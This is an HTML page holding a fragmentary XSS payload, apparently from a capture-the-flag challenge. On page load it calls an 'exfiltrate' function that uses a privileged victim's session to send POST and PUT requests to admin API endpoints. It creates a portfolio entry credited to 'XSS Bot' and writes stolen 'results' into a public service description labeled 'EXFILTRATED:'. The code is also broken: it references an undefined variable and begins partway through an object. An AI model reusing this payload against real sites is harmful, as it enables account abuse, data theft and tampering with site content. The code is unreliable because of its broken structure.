<!DOCTYPE html>

<script>

    const stringified = JSON.stringify(results);

        category: "Security",
        client: "XSS Bot",
        link: "https://prepoc.com",
        featured: true,
        published: true,
        technologies: ["React"]
      };
      
      await fetch('/api/admin/portfolio', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(projectPayload)
      });
      
      await fetch('/api/admin/portfolio/project-1', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: "project-1",
          ...projectPayload
        })
      });
    } catch (e) {}

    try {
      const serviceRes = await fetch('/api/services');
      const serviceData = await serviceRes.json();
      const service5 = serviceData.data.find(s => s.id === 5 || s.id === "5") || serviceData.data[serviceData.data.length - 1];
      if (service5) {
        const updatedService = {
          ...service5,
          desc: "EXFILTRATED: " + stringified
        };
        await fetch('/api/admin/services/5', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(updatedService)
        });
        await fetch('/api/admin/services', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(updatedService)
        });
      }
    } catch (e) {}

  } catch (err) {
    //
  }
}
exfiltrate();
</script>
